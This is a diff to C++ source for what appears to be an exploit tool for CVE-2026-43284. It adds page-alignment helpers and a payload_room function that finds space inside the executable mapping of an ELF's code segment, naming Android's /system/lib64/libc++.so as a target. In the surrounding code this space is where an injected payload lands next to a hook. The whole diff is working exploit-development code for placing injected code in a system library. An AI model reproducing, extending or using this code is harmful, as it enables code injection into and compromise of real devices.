@@ -47,6 +47,46 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             return b - a < a_len;
         }
 
+        /* Smallest mapping granularity we can trust without a runtime page-size
+         * query: the 4 KiB base page. The ELF's p_align is the segment's declared
+         * alignment (Android archives use the 16 KiB max-page-size), which can
+         * exceed the page the loader actually maps with. */
+        constexpr std::uint64_t kElfBasePageBytes = 4096U;
+
+        /* Rounding unit for the executable segment's page tail. p_align is only
+         * used when it is finer than the base page; a larger p_align (e.g. the
+         * common 0x4000) must not inflate a 4 KiB-page mapping. The resulting
+         * room is a subset of the real mapping on any page size (fail-closed). */
+        std::uint64_t effective_page_bytes(std::uint64_t p_align) noexcept {
+            if (p_align > 1U && p_align < kElfBasePageBytes) {
+                return p_align;
+            }
+            return kElfBasePageBytes;
+        }
+
+        std::uint64_t page_align_down(std::uint64_t value, std::uint64_t page) noexcept {
+            if (page <= 1U) {
+                return value;
+            }
+            return value - (value % page);
+        }
+
+        std::uint64_t page_align_up(std::uint64_t value, std::uint64_t page) noexcept {
+            if (page <= 1U) {
+                return value;
+            }
+            const std::uint64_t remainder = value % page;
+            if (remainder == 0U) {
+                return value;
+            }
+            const std::uint64_t delta = page - remainder;
+            constexpr std::uint64_t kMax = ~std::uint64_t{0};
+            if (value > kMax - delta) {
+                return kMax;
+            }
+            return value + delta;
+        }
+
         struct SectionHeader final {
             std::uint32_t name = 0U;
             std::uint32_t type = 0U;
@@ -189,6 +229,113 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             return false;
         }
 
+        /* How many bytes after the executable segment end are still inside a
+         * mapped executable region.
+         *
+         * Source (a) is the historical BSS tail (p_memsz - p_filesz). Source
+         * (b) is the page-aligned tail of the file page that holds the segment
+         * end: the loader maps whole base pages, so when p_filesz is not page
+         * aligned the bytes up to the next page boundary are part of the
+         * segment's executable mapping. The real /system/lib64/libc++.so
+         * executable LOAD is exactly this shape (p_filesz == p_memsz, its end
+         * shares a file page with the following RW LOAD, which maps that page
+         * at a disjoint vaddr), and upstream DirtyFrag relies on the same page.
+         *
+         * (b) is clamped twice so the landing interval stays fail-closed: it
+         * never crosses EOF, and it never enters another PT_LOAD's page-aligned
+         * mapping (if such a mapping already covers the segment end the room is
+         * zero). The result is the larger of (a) and the clamped (b), so the
+         * pre-existing BSS path is unchanged. */
+        std::uint64_t payload_room(const std::uint8_t *data, std::size_t size,
+                                   const ElfImage &image) noexcept {
+            const std::uint64_t bss_room =
+                    image.exec_memsz > image.exec_segment.size
+                            ? image.exec_memsz - image.exec_segment.size
+                            : 0U;
+            const std::uint64_t site_file =
+                    image.exec_segment.file_offset + image.exec_segment.size;
+            const std::uint64_t site_vaddr =
+                    image.exec_segment.vaddr + image.exec_segment.size;
+            if (site_file >= static_cast<std::uint64_t>(size)) {
+                return bss_room;
+            }
+            const std::uint64_t page = effective_page_bytes(image.exec_align);
+            const std::uint64_t segment_page_end = page_align_up(site_file, page);
+            std::uint64_t room = segment_page_end - site_file;
+            /* Never read past EOF. */
+            const std::uint64_t eof_room =
+                    static_cast<std::uint64_t>(size) - site_file;
+            if (room > eof_room) {
+                room = eof_room;
+            }
+            /* The landing interval must not overlap any other PT_LOAD's
+             * page-aligned mapping; cut back to that mapping's start (which,
+             * being page aligned, is either at the segment end itself or at or
+             * beyond the next page boundary). */
+            for (std::uint16_t i = 0U; i < image.phnum; ++i) {
+                if (i == image.exec_segment_index) {
+                    continue;
+                }
+                const std::uint64_t base =
+                        image.phoff + static_cast<std::uint64_t>(i) *
+                                              kElfProgramHeaderBytes;
+                if (!within(base, kElfProgramHeaderBytes, size)) {
+                    continue;
+                }
+                const std::uint8_t *p = data + static_cast<std::size_t>(base);
+                if (read_u32(p) != kElfProgramLoad) {
+                    continue;
+                }
+                const std::uint64_t p_offset = read_u64(p + 8U);
+                const std::uint64_t p_vaddr = read_u64(p + 0x10U);
+                const std::uint64_t p_filesz = read_u64(p + 0x20U);
+                if (p_filesz == 0U || !within(p_offset, p_filesz, size)) {
+                    continue;
+                }
+                const std::uint64_t map_file_start = page_align_down(p_offset, page);
+                const std::uint64_t map_file_end =
+                        page_align_up(p_offset + p_filesz, page);
+                const std::uint64_t vaddr_delta = p_offset - map_file_start;
+                if (p_vaddr < vaddr_delta) {
+                    /* Malformed relation; fail closed against this mapping. */
+                    room = 0U;
+                    continue;
+                }
+                const std::uint64_t map_vaddr_start = p_vaddr - vaddr_delta;
+                const std::uint64_t map_span = map_file_end - map_file_start;
+                constexpr std::uint64_t kMax = ~std::uint64_t{0};
+                if (map_vaddr_start > kMax - map_span) {
+                    /* Malformed mapping range; fail closed. */
+                    room = 0U;
+                    continue;
+                }
+                const std::uint64_t map_vaddr_end = map_vaddr_start + map_span;
+                if (map_vaddr_start >= site_vaddr + room) {
+                    continue;
+                }
+                if (map_vaddr_end <= site_vaddr) {
+                    continue;
+                }
+                if (map_vaddr_start <= site_vaddr) {
+                    /* This mapping already covers the landing site. */
+                    room = 0U;
+                } else {
+                    room = map_vaddr_start - site_vaddr;
+                }
+            }
+            /* Defensive bound: stay inside the executable segment's own
+             * page-aligned mapping. */
+            const std::uint64_t exec_map_end_vaddr =
+                    image.exec_segment.vaddr +
+                    (segment_page_end - image.exec_segment.file_offset);
+            if (exec_map_end_vaddr <= site_vaddr) {
+                room = 0U;
+            } else if (room > exec_map_end_vaddr - site_vaddr) {
+                room = exec_map_end_vaddr - site_vaddr;
+            }
+            return bss_room > room ? bss_room : room;
+        }
+
         /* Shared tail for the symbol and offset entry points. */
         bool finalize_target(const std::uint8_t *data, std::size_t size, const ElfImage &image,
                              std::uint64_t hook_file_offset, std::uint64_t hook_vaddr,
@@ -264,9 +411,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
 
             out.payload_file_offset = image.exec_segment.file_offset + image.exec_segment.size;
             out.payload_vaddr = image.exec_segment.vaddr + image.exec_segment.size;
-            out.payload_max_bytes = image.exec_memsz > image.exec_segment.size
-                                            ? image.exec_memsz - image.exec_segment.size
-                                            : 0U;
+            out.payload_max_bytes = payload_room(data, size, image);
             out.valid = true;
             return true;
         }
@@ -404,6 +549,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             const std::uint64_t p_vaddr = read_u64(p + 0x10U);
             const std::uint64_t p_filesz = read_u64(p + 0x20U);
             const std::uint64_t p_memsz = read_u64(p + 0x28U);
+            const std::uint64_t p_align = read_u64(p + 0x30U);
             if (type != kElfProgramLoad || (flags & kElfFlagExec) == 0U) {
                 continue;
             }
@@ -418,6 +564,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 out.exec_segment.size = p_filesz;
                 out.exec_segment.vaddr = p_vaddr;
                 out.exec_memsz = p_memsz;
+                out.exec_align = p_align;
                 out.exec_segment_index = i;
                 out.has_exec_segment = true;
                 chosen = true;
